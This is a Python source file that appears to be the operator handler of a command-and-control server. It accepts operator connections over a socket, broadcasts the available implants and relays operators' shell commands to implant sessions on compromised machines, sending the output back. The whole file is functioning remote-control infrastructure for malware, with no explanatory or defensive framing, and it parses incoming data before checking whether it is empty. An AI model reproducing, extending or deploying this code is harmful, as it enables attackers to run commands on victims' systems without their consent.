import socket
import threading
from client.pb import operatorpb_pb2
from server.mtls.mtls import session

class OperatorHandler:
    def __init__(self, operator_endpoint, operators, implant_handler, implant_listener):
        self.operators = operators
        self.implant_handler = implant_handler
        self.implant_listener = implant_listener
    
        self.host, self.port = operator_endpoint
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def start(self):
        threading.Thread(target=self._accept_operator).start() #this is so we can listen and have execute commands from server console

    # Turn message into a protobuf SessionCmdOutput and ssend to client
    def _send_operator(self, message, operator, session_id):
        response = operatorpb_pb2.SessionCmdOutput(cmdOutput=message, id=session_id)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.SessionCmdOutput,
            data=response.SerializeToString()
        )

        operator.send(message.SerializeToString())
    def _accept_operator(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when an operator connects
            operator, address = self.sock.accept()

            self.operators.append(operator)
            self.implant_handler.brodcastImplants(operator)

            print("[+]Connected to a new operator at " + address[0] + ":" + str(address[1]) )
            threading.Thread(target = self._listen_operator,args = (operator,address)).start()

    def _listen_operator(self, operator, address):
        size = 1024
        while True:
            data = operator.recv(size)

            message = operatorpb_pb2.Message()
            message.ParseFromString(data)

            if not data:
                print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
                operator.close()
                self.operators.remove(operator)
                break

            elif message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
                session_cmd = operatorpb_pb2.SessionCmd()
                session_cmd.ParseFromString(message.data)

                command_str = session_cmd.cmd
                session_id = session_cmd.id

                #TODO: proper error handling
                if session_id not in self.implant_listener.sessions.list():
                    print("Session doesn't exist")

                else:
                    out = self._shell_session(command_str, session_id)
                    self._send_operator(out,operator,session_id)

    def _shell_session(self, command_str, session_id):
            conn, addr = self.implant_listener.sessions.get(session_id) 
            output = session(conn, command_str)
            return (output)
